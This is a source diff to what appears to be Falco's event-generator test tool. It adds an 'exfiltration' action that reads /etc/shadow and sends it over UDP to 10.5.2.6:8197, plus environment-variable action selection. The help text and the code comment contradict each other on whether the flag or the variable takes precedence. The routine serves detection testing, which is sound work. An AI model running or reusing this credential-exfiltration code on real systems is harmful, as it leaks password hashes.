@@ -21,10 +21,13 @@ along with falco.  If not, see <http://www.gnu.org/licenses/>.
 #include <map>
 #include <set>
 #include <string>
+#include <fstream>
+#include <sstream>
 #include <cstring>
 #include <cstdlib>
 #include <unistd.h>
 #include <getopt.h>
+#include <sys/errno.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
@@ -64,7 +67,12 @@ void usage(char *program)
 	printf("                                                     (used by user_mgmt_binaries below)\n");
 	printf("          user_mgmt_binaries                         Become the program \"vipw\", which triggers\n");
 	printf("                                                     rules related to user management programs\n");
+	printf("          exfiltration                               Read /etc/shadow and send it via udp to a\n");
+	printf("                                                     specific address and port\n");
 	printf("          all                                        All of the above\n");
+	printf("       The action can also be specified via the environment variable EVENT_GENERATOR_ACTIONS\n");
+	printf("           as a colon-separated list\n");
+	printf("       if specified, -a/--action overrides any environment variables\n");
 	printf("     -i/--interval: Number of seconds between actions\n");
 	printf("     -o/--once: Perform actions once and exit\n");
 }
@@ -81,6 +89,50 @@ void open_file(const char *filename, const char *flags)
 		fprintf(stderr, "Could not open %s for writing: %s\n", filename, strerror(errno));
 	}
 
+}
+
+void exfiltration()
+{
+	ifstream shadow;
+
+	shadow.open("/etc/shadow");
+
+	if(!shadow.is_open())
+	{
+		fprintf(stderr, "Could not open /etc/shadow for reading: %s", strerror(errno));
+		return;
+	}
+
+	string line;
+	string shadow_contents;
+	while (getline(shadow, line))
+	{
+		shadow_contents += line;
+		shadow_contents += "\n";
+	}
+
+	int rc;
+	ssize_t sent;
+	int sock = socket(PF_INET, SOCK_DGRAM, 0);
+	struct sockaddr_in dest;
+
+	dest.sin_family = AF_INET;
+	dest.sin_port = htons(8197);
+	inet_aton("10.5.2.6", &(dest.sin_addr));
+
+	if((rc = connect(sock, (struct sockaddr *) &dest, sizeof(dest))) != 0)
+	{
+		fprintf(stderr, "Could not bind listening socket to dest: %s\n", strerror(errno));
+		return;
+	}
+
+	if ((sent = send(sock, shadow_contents.c_str(), shadow_contents.size(), 0)) != shadow_contents.size())
+	{
+		fprintf(stderr, "Could not send shadow contents via udp datagram: %s\n", strerror(errno));
+		return;
+	}
+
+	close(sock);
 }
 
 void touch(const char *filename)
@@ -312,7 +364,8 @@ map<string, action_t> defined_actions = {{"write_binary_dir", write_binary_dir},
 					 {"non_sudo_setuid", non_sudo_setuid},
 					 {"create_files_below_dev", create_files_below_dev},
 					 {"exec_ls", exec_ls},
-					 {"user_mgmt_binaries", user_mgmt_binaries}};
+					 {"user_mgmt_binaries", user_mgmt_binaries},
+					 {"exfiltration", exfiltration}};
 
 
 void create_symlinks(const char *program)
@@ -400,6 +453,30 @@ int main(int argc, char **argv)
 		default:
 			usage(argv[0]);
 			exit(1);
+		}
+	}
+
+	//
+        // Also look for actions in the environment. If specified, they
+        // override any specified on the command line.
+	//
+	char *env_action = getenv("EVENT_GENERATOR_ACTIONS");
+
+	if(env_action)
+	{
+		actions.clear();
+
+		string envs(env_action);
+		istringstream ss(envs);
+		string item;
+		while (std::getline(ss, item, ':'))
+		{
+			if((it = defined_actions.find(item)) == defined_actions.end())
+			{
+				fprintf(stderr, "No action with name \"%s\" known, exiting.\n", item.c_str());
+				exit(1);
+			}
+			actions.insert(*it);
 		}
 	}
 
